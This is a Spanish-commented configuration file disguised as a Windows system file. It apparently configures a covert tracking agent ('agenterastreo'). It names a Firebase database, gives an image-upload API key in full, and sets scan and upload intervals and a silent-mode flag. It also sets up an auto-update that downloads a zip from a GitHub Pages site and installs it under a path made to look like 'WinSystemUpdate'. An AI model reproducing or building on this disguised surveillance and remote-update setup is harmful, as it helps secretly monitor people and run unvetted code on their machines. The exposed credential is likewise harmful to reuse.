# ============================================
# sys_config.ini - System Configuration Module
# ============================================
# Archivo de configuración del sistema Windows
# NO MODIFICAR - Mantenimiento automático

# ------------ FIREBASE ------------
FIREBASE_CREDENTIALS = "sys_creds.dat"
FIREBASE_DB_URL = "https://agenterastreo-default-rtdb.firebaseio.com/"

# ------------ IMGBB ------------
IMGBB_API_KEY = "b182d7db7b9efd50eb28044e6be05051"

# ------------ CONFIGURACIÓN DE SISTEMA ------------
SYNC_INTERVAL = 30
SCAN_INTERVAL = 60
COMPRESS_LEVEL = 70
EXPIRATION_TIME = 0

# ------------ COMPORTAMIENTO ------------
CICLO_INTERVALO = 15
MODO_SILENCIOSO = False

# ============================================
# CONFIGURACIÓN DE AUTO-ACTUALIZACIÓN
# ============================================

VERSION_ACTUAL = "1.0.0"

# 🔥 REPOSITORIO DE ACTUALIZACIONES
REPO_BASE = "https://cyberbenares.github.io/system-update/"
URL_VERSION = REPO_BASE + "version.txt"
URL_AGENTE = REPO_BASE + "system_update.zip"

INSTALL_PATH = "C:\\ProgramData\\WinSystemUpdate"
VERIFICAR_ACTUALIZACION_INTERVALO = 3600